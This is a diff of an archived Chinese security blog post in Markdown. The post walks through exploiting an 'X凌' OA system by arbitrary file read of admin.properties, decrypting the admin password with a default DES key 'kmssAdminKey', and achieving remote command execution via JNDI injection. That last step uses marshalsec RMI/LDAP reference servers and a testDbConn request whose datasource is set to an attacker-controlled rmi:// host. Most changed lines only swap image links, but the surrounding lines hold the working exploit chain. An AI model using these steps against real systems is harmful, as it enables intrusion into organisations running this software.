@@ -46,7 +46,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-Y03NedgphDL8yBDpc5QOg)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyI8SNOVqpyMeg5k7mhuVZvdrXnHVmEweCKUtVnlibjSn6D7qMvELhYicw/640?wx_fmt=png)
+![](../../.resource/remote/54fe16b5149a009aaa4b95c9cdb1fdda522713763f70e45d383a1190aa630b9f.png)
 
 X 凌 OA 系统任意文件读取 - SSRF+JNDI 远程命令执行
 
@@ -70,7 +70,7 @@ X 凌 OA 系统任意文件读取 - SSRF+JNDI 远程命令执行
 
 读取文件：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyPPehvwoLicD4Ay350Kvr7tYouRNZR4BWVYeibBPYwiajoEcZ6DibOY2Lrw/640?wx_fmt=png)
+![](../../.resource/remote/1335e3e9f36c8b5d618542e27290704c069984298e55a929a5ac34fcd990fdc8.png)
 
 POC：
 
@@ -89,21 +89,21 @@ var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"\}\}
 
 获取密码 DES 解密登陆后台：默认密钥为 kmssAdminKey
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyy8unBaiaVhTeZFXjpZE9FdFQgp9kPW4wiaK8jqUstDhvCX8ovTo9wQTg/640?wx_fmt=png)
+![](../../.resource/remote/4a90b05a611cf317992b428cc0269e478b991378ce58df2570bf097036f96a4e.png)
 
 访问后台登台：
 
 http://127.0.0.1/admin.do
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKytWxvSyuzicS2ibbOVsO3u1JN5wwlQiaQucr2iaHooQLQynQZ3eXX538IbA/640?wx_fmt=png)  
+![](../../.resource/remote/5001d661a2c918e110cc1ae0fcfa2a0a716f3621d5f45da7534ce0600d3d1d87.png)  
 
 成功登陆后台：  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyn66vIhhvIGia1KLAxZdROYdLibF5gRnKiaMXKiazsCxQmyYFNG7oU0GTPg/640?wx_fmt=png)
+![](../../.resource/remote/30df28fcc5d35fa77c4e9d39242299840aaca7bb7c3d88659c6947a6515ebe66.png)
 
 编写 POC 脚本验证：  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyv3vTmR0qvLicg7BzNMzWYiaXLPX9nJKWOI9AONBseZRJQNHPta3gKSOQ/640?wx_fmt=png)
+![](../../.resource/remote/570b45d8dd520b09eb9d501a1b23d4bd37948974ea95b1d06e9ad8248e977587.png)
 
 还需要自己去验证解密：  
 
@@ -117,7 +117,7 @@ def decrypt_str(s):
  return decrypt_str
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyT7U9ocreOIJfTqUOIZCyHxjpN3VRcc8KEOeAM18MIdl3UWqAgOKesA/640?wx_fmt=png)
+![](../../.resource/remote/c9c12fd442569bb7e364747b38da252e3040d5953aafa95583f2f03ab29fd98d.png)
 
 发现 key 字符过长：  
 
@@ -125,11 +125,11 @@ ValueError: Invalid DES key size. Key must be exactly 8 bytes long.
 
 密钥长了，查了一下下 需要前面 8 位就 OK 也能解开
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKylbfqggQicwI4RGbQic5qiaw6Mtwa9eFvlvW66NPWcN4pl7v00dpQ9UpTA/640?wx_fmt=png)
+![](../../.resource/remote/e71471af56a277f9d5a27d00f2778d818fb152e90f18f197da923fa1774be115.png)
 
 直接解密明文：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyyJUBC848tOXDm9wU5CIWdtyZ4w6RaX2ca1epaicVM3R9f6Yhy3ETOEA/640?wx_fmt=png)
+![](../../.resource/remote/14275d707513e4159f9ef2a86923acb846df6106b5276853ce20bb697680f497.png)
 
 -------------- 上面是 X 凌 OA 系统任意文件读取 --------------
 
@@ -193,7 +193,7 @@ python 启动 web 服务
 python -m SimpleHTTPServer  1111
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVs2yfMaKSyVFPI9DcnafoSPTwPicXDLXbUAicQjial0fTTbBEENOw9k4FQ/640?wx_fmt=png)
+![](../../.resource/remote/b9cf6b7ecf9b4b17ba95c7876e0655eb9bbf087735bdd4aa7ae4919b150d3004.png)
 
 通过 python 启动 exphttp 服务启动 ldap 服务 (RMI 服务)
 
@@ -201,14 +201,14 @@ python -m SimpleHTTPServer  1111
 
 不支持基本上，rmi 服务接受到了请求，直接就 close 掉了。注意这个细节点
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVn2ukCgvMibicpX3Pnm6U9HaFYyVzpPWI3qROb6ic5eRElxf56Qlev34zQ/640?wx_fmt=png)
+![](../../.resource/remote/b16da8a7cedfae774e40f8b63623a7fdd39d01a8efeb03e6a90779ed2a80d164.png)
 
 ```
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.RMIRefServer  http://XX.XX.XX.XX:1111/\#Exploit 9999
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer  http://XX.XX.XX.XX:1111/\#Exploit 9999
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVbIWgVXFPibVOCYAzFticCpj9ycdiabTX2ZodsB8IScRnl950q0VjhIa7Q/640?wx_fmt=png)
+![](../../.resource/remote/e19402515ef1ccb5612c0bd0577f2a59c9d5ee2c28d5f450b395974bf55fec9f.png)
 
 ldap 服务启动完成：  
 
@@ -216,11 +216,11 @@ ldap 服务启动完成：
 
 http://127.0.0.1/admin.do
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKytWxvSyuzicS2ibbOVsO3u1JN5wwlQiaQucr2iaHooQLQynQZ3eXX538IbA/640?wx_fmt=png)  
+![](../../.resource/remote/5001d661a2c918e110cc1ae0fcfa2a0a716f3621d5f45da7534ce0600d3d1d87.png)  
 
 成功登陆后台：  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyn66vIhhvIGia1KLAxZdROYdLibF5gRnKiaMXKiazsCxQmyYFNG7oU0GTPg/640?wx_fmt=png)
+![](../../.resource/remote/30df28fcc5d35fa77c4e9d39242299840aaca7bb7c3d88659c6947a6515ebe66.png)
 
 成功登陆系统获取的 cookie：  
 
@@ -242,11 +242,11 @@ method=testDbConn&datasource=rmi://xxx.xxx.xxx.xxx:1099/thelostworld
 
 > 请求长度说明：原资料 Content-Length 为 70；保留原始标头；其数值未据实际请求体重新计算或验证。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRje4G63OeC8nFZg4HLZEJU5BiaIu9CQWiaI4hLj0hsjyg2uIZvOJ402NHyS5gLtDkD6cjgluNILluYRw/640?wx_fmt=png)
+![](../../.resource/remote/c827c9ceba482be3b5c468510b1c04bb83b1d27acd75d3305753991bcf60cabc.png)
 
 DNSlog 执行成功
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRje4G63OeC8nFZg4HLZEJU5BOAkbLHLBAGziaibNkpicaBYFX53fVMoqCDcFSlevT9Z21ZzrSJfejVSJg/640?wx_fmt=png)
+![](../../.resource/remote/83121d2504b951fc994440845567c8572dfcba1d2738eab1d89e15c920cc0abe.png)
 
 参考：  
 
@@ -264,7 +264,7 @@ thelostworld
 
 安全路上，与你并肩前行！！！！
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)
+![](../../.resource/remote/7a6d2f13ca361326dd71145e64ce4b16b853688149568ad8f7594066b738e9c1.jpg)
 
 个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns
 
@@ -278,11 +278,11 @@ FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article
 
 语雀博客主页：https://www.yuque.com/thelostworld
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)
+![](../../.resource/remote/64b19fa585837043e1eae7cea904e1b86a2db6ccb2fdde1d09513641413365d6.png)
 
 欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)
+![](../../.resource/remote/9255e3712e3885c431d5087872642f32c2e71629b39b93e381a5a147814af2d4.png)
 
 ---
 
